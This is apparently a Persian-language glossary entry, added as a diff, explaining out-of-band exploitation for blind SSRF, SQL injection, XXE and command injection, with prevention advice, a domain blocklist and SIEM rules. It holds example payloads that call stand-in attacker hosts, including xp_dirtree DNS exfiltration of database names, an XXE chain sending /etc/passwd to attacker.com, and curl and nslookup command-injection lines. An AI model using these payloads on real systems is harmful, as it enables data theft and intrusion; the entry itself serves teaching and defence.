@@ -1,0 +1,233 @@
+---
+slug: "out-of-band"
+term: "Out-of-Band"
+abbreviation: "OOB"
+shortDefinition: "تکنیکی که در آن داده از طریق کانالی جدا از ارتباط اصلی ارسال می‌شود. در تست امنیتی، به معنای دریافت تأییدیه یک بهره‌برداری از طریق وسایل خارجی (مانند درخواست DNS یا فراخوانی HTTP) است."
+category: "تکنیک‌های حمله"
+tags: ["oob", "ssrf", "کور", "تخلیه", "تست"]
+relatedTerms: ["blind-ssrf", "dns-log", "vps", "ssrf"]
+language: "fa"
+hasTranslation: true
+translationSlug: "out-of-band"
+difficulty: "intermediate"
+lastUpdated: "2026-02-26"
+sources:
+  - "https://portswigger.net/burp/documentation/desktop/tools/collaborator"
+---
+
+## تعریف کوتاه
+Out-of-band (OOB) وقتی است که نمی‌توانی نتیجه را مستقیماً ببینی، بنابراین از یک کانال جانبی استفاده می‌کنی. مثل اینکه در یک اتاق شلوغ نمی‌توانی جواب کسی را بشنوی، از او می‌خواهی بهت پیامک بدهد. در هک، این یعنی وادار کردن هدف به تماس با سرور خودت، که ثابت می‌کند بهره‌برداری کار کرده است.
+
+## تعریف کامل
+ارتباط Out-of-band در تست امنیتی به استفاده از یک کانال جایگزین برای تأیید یا تخلیه داده زمانی که پاسخ مستقیم قابل مشاهده نیست اشاره دارد.
+
+**مفهوم کلیدی:**
+- **In-band**: پاسخ از طریق همان کانال برمی‌گردد
+- **Out-of-band**: پاسخ از طریق کانال متفاوتی می‌آید
+
+**کانال‌های رایج OOB:**
+- پرس‌وجوهای DNS
+- درخواست‌های HTTP/HTTPS
+- SMTP (ایمیل)
+- اتصالات FTP
+- ICMP (پینگ)
+
+**چرا مورد نیاز است:**
+- آسیب‌پذیری‌های کور (بدون خروجی مستقیم)
+- پاسخ‌های فیلتر شده
+- تأخیرهای زمانی نتایج را پنهان می‌کنند
+- تأیید بهره‌برداری بدون دیدن خروجی
+
+**زیرساخت:**
+- VPS شخصی
+- Burp Collaborator
+- interactsh
+- سرورهای فراخوانی سفارشی
+- سرویس‌های ثبت DNS
+
+## چرا مهم است
+- وجود آسیب‌پذیری‌های کور را ثابت می‌کند
+- وقتی استخراج مستقیم مسدود است، داده را تخلیه می‌کند
+- فیلترها و WAFها را دور می‌زند
+- برای SSRF کور، XXE، SQLi ضروری است
+- مثبت کاذب را از آسیب‌پذیری‌های واقعی تشخیص می‌دهد
+
+## چگونه مهاجمان از آن استفاده می‌کنند (و تست اخلاقی)
+**تشخیص SSRF کور:**
+
+```python
+# نمی‌توانی پاسخ را ببینی، از OOB استفاده کن
+payload = "http://unique-id.attacker-vps.com"
+
+POST /api/fetch-url
+{"url": payload}
+
+# سرور درخواست می‌کند → سرور OOB آن را ثبت می‌کند
+# اثبات SSRF حتی بدون دیدن پاسخ
+```
+
+**تزریق SQL کور:**
+
+```sql
+-- نمی‌توانی نتایج پرس‌وجو را ببینی، از OOB استفاده کن
+'; EXEC master..xp_dirtree '\\unique-id.attacker.com\share';--
+
+-- اگر آسیب‌پذیر باشد، سرور به attacker.com جستجوی DNS انجام می‌دهد
+-- لاگ‌های DNS تزریق SQL را تأیید می‌کنند
+```
+
+**XXE (نهاد خارجی XML) OOB:**
+
+```xml
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://unique-id.attacker.com/data">
+]>
+<root>&xxe;</root>
+
+<!-- سرور به attacker.com درخواست HTTP می‌فرستد -->
+<!-- آسیب‌پذیری XXE را تأیید می‌کند -->
+```
+
+**تخلیه داده از طریق OOB:**
+
+```sql
+-- تخلیه نام دیتابیس
+'; DECLARE @data varchar(max);
+SELECT @data = DB_NAME();
+EXEC('master..xp_dirtree "\\' + @data + '.attacker.com\share"');--
+
+-- پرس‌وجوی DNS: databasename.attacker.com
+-- مهاجم نام دیتابیس را در لاگ‌های DNS می‌بیند
+```
+
+**تزریق دستور کور:**
+
+```bash
+; nslookup unique-id.attacker.com
+; curl http://unique-id.attacker.com
+; ping -c1 unique-id.attacker.com
+```
+
+## چگونه تشخیص یا پیشگیری کنیم
+**پیشگیری:**
+
+**سطح شبکه:**
+- مسدود کردن DNS خروجی به سرورهای غیر سازمانی
+- محدود کردن HTTP/HTTPS خروجی
+- نظارت و هشدار در مورد اتصالات خروجی غیرعادی
+- استفاده از فیلترینگ DNS
+- پیاده‌سازی پروکسی‌های خروجی
+
+**سطح برنامه:**
+```python
+# مسدود کردن IPهای خصوصی و دامنه‌های مشکوک
+BLOCKED_DOMAINS = [
+  'burpcollaborator.net',
+  'interact.sh',
+  'oast.pro',
+  'oast.fun'
+]
+
+def validate_url(url):
+    parsed = urlparse(url)
+    
+    # مسدود کردن سرویس‌های OOB شناخته شده
+    if any(blocked in parsed.hostname for blocked in BLOCKED_DOMAINS):
+        return False
+    
+    # حل و مسدود کردن IPهای خصوصی
+    ip = socket.gethostbyname(parsed.hostname)
+    if is_private_ip(ip):
+        return False
+    
+    return True
+```
+
+**تشخیص:**
+
+**نظارت بر:**
+- DNS خروجی به دامنه‌های ناشناخته
+- درخواست‌های HTTP به دامنه‌های مشکوک
+- داده‌های کدگذاری شده در پرس‌وجوهای DNS
+- الگو: درخواست‌های زیاد به یک دامنه ناشناخته
+- درخواست‌ها با زیردامنه‌های منحصر به فرد
+
+**نمونه الگوی مشکوک:**
+```
+abc123.attacker.com
+def456.attacker.com
+ghi789.attacker.com
+# شناسه‌های یکتای متوالی = احتمالاً تست OOB
+```
+
+**قوانین SIEM:**
+```
+هشدار اگر:
+  - پرس‌وجوی DNS خروجی به *.burpcollaborator.net
+  - DNS خروجی با زیردامنه > ۳۰ کاراکتر
+  - چندین میزبان به یک دامنه غیرعادی پرس‌وجو می‌کنند
+  - پرس‌وجوی DNS شامل الگوهای base64/hex است
+```
+
+## باورهای غلط رایج
+- "بدون پاسخ = بدون آسیب‌پذیری" - OOB همچنان می‌تواند آن را ثابت کند
+- "مسدود کردن HTTP، OOB را مسدود می‌کند" - DNS همچنان کار می‌کند
+- "OOB فقط برای حملات پیشرفته است" - تکنیک پایه، به طور گسترده استفاده می‌شود
+- "نمی‌توان داده زیادی تخلیه کرد" - می‌توان داده قابل توجهی در DNS کدگذاری کرد
+- "WAF OOB را مسدود می‌کند" - OOB اکثر WAFها را دور می‌زند
+
+## مثال واقعی
+**SQLi کور از طریق DNS OOB (تست نفوذ واقعی)**
+
+```sql
+-- هدف: برنامه بانکی
+-- آسیب‌پذیری: تزریق SQL کور
+-- بدون پیام خطا، بدون خروجی قابل مشاهده
+
+-- گام ۱: تأیید تزریق
+id=1'; WAITFOR DELAY '00:00:10'--
+-- صفحه ۱۰ ثانیه طول می‌کشد → SQLi تأیید شد
+
+-- گام ۲: تخلیه داده از طریق DNS
+id=1'; 
+DECLARE @data VARCHAR(max);
+SELECT @data = name FROM sys.databases WHERE database_id = 1;
+EXEC('master..xp_dirtree "\\' + @data + '.attacker-domain.com\a"');--
+
+-- لاگ DNS نشان می‌دهد: master.attacker-domain.com
+-- نام دیتابیس بدون خروجی مستقیم استخراج شد!
+```
+
+**تخلیه داده XXE کور**
+
+```xml
+<!-- برنامه XML را پردازش می‌کند، پاسخی نشان نمی‌دهد -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+  %send;
+]>
+<foo>&trigger;</foo>
+```
+
+```xml
+<!-- evil.dtd روی سرور مهاجم -->
+<!ENTITY % send "<!ENTITY trigger SYSTEM 'http://attacker.com/?data=%file;'>">
+```
+
+نتیجه: محتویات `/etc/passwd` از طریق HTTP به attacker.com ارسال شد.
+
+**SSRF کور در Capital One**
+
+اگرچه SSRF اولیه کاملاً کور نبود، مهاجم از تکنیک‌های OOB برای:
+۱. تأیید دسترسی به سرویس متادیتا
+۲. بررسی پاسخ نقاط پایانی مختلف
+۳. تست اعتبار اعتبارنامه
+۴. نقشه‌برداری شبکه داخلی استفاده کرد
+
+حتی اگر پاسخ مستقیم فیلتر می‌شد، OOB کار می‌کرد.
+
+## اصطلاحات مرتبط
+Blind SSRF, DNS Log, VPS, SSRF, XXE
